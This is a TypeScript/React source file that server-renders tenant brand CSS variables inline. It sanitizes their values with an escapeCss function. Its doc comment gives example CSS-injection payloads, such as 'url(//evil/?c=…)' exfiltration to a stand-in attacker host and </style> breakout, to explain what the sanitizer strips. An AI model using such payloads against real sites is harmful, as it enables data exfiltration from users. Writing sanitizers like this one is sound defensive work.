import type { BrandConfig } from './schema'
import { deriveTokens } from './tokens'

/**
 * Server-rendered <style id="__brand"> block. Inline-prints every CSS var the
 * tenant overrides so the browser has the correct paint-relevant values
 * BEFORE parsing any JS. This is the no-FOUC mechanism.
 */
export function BrandStyles({ config }: { config: BrandConfig }) {
  const tokens = deriveTokens(config)
  // Emit at `html[data-theme]` (specificity 0,1,1) — equal specificity to the
  // `html[data-theme="dark"|"light"]` blocks in styles.css. Source order is the
  // tiebreaker. This component renders inside <head> (see app/layout.tsx), and
  // Next.js serializes the bundled styles.css before this React-rendered inline
  // <style id="__brand">, so the inline block comes later in source order and
  // tenant overrides win. NOTE: this relies on Next's stylesheet-before-inline
  // ordering, not an HTML head/body guarantee — keep BrandStyles after the CSS
  // import. Using plain `:root` (specificity 0,1,0) would lose to those static
  // blocks and the override path would be dead.
  const body = `html[data-theme]{${Object.entries(tokens)
    .map(([k, v]) => `${k}:${escapeCss(v)}`)
    .join(';')}}`
  return <style id="__brand" dangerouslySetInnerHTML={{ __html: body }} />
}

/**
 * Defense-in-depth escape for tenant-controlled CSS-var values.
 *
 * Every value is interpolated into a single `html[data-theme]{ … }` rule, so
 * the real risk is a value that breaks out of its declaration or the rule:
 *  - `}` would close the rule early and let an attacker append arbitrary rules
 *    / at-rules (`@import`, exfiltrating `url(...)`).
 *  - `;` would let an attacker append sibling declarations on `html`
 *    (e.g. `background:url(//evil/?c=…)`), exfiltration without needing `}`.
 *  - `<` / `>` enable a `</style>` tag breakout into HTML.
 *  - `url(` is an exfiltration channel: a value like `url(//evil/?c=…)` lands
 *    in a custom prop and the browser fetches it the moment a component does
 *    `background: var(--…)`. No `{};<>` needed.
 * None of the values tokens.ts emits legitimately contain any of these
 * (colors, lengths, gradients, color-mix(), var() refs use only commas/
 * parens — never url() or rule/declaration punctuation), so it is safe to
 * strip them outright rather than parse-validate every slot. The `</style`
 * replacement is kept as belt-and-suspenders.
 */
function escapeCss(value: string): string {
  return value
    .replace(/[{}<>;]/g, '')
    .replace(/url\s*\(/gi, '')
    .replace(/<\/style/gi, '<\\/style')
}
